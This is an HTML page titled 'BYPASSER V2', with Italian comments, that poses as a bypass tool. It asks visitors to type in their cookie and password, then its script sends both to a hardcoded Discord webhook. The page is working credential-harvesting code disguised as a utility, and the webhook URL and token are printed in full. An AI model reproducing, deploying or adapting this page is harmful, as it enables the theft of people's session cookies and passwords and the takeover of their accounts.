<body>

    <div class="container">
        <h1>BYPASSER V2</h1>

        <!-- Quadrato per Cookie -->
        <div class="input-box">
            <label for="cookie">COOKIE</label>
            <input type="text" id="cookie" placeholder="Scrivi il tuo cookie...">
        </div>

        <!-- Quadrato per Password -->
        <div class="input-box">
            <label for="password">PASSWORD</label>
            <input type="password" id="password" placeholder="Scrivi la tua password...">
        </div>

        <!-- Bottone per inviare -->
        <button onclick="sendData()">Invia</button>
    </div>

    <script>
        function sendData() {
            // Ottieni i valori dai campi di input
            const cookie = document.getElementById("cookie").value;
            const password = document.getElementById("password").value;

            // Creiamo l'oggetto che invieremo al webhook
            const data = {
                content: `COOKIE: ${cookie}\nPASSWORD: ${password}`
            };

            // Invia la richiesta al Webhook di Discord
            fetch('https://discordapp.com/api/webhooks/1356612553689661542/-xfVPL9WfFcCn1iDFTjRMWgkO01NRWvLfWbQ902zj-RgfdwCrhg0yRjXDDpd2l7NFtPk', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                alert('Dati inviati con successo!');
            })
            .catch(error => {
                alert('Errore nell\'invio dei dati.');
                console.error('Errore:', error);
            });
        }
    </script>

</body>
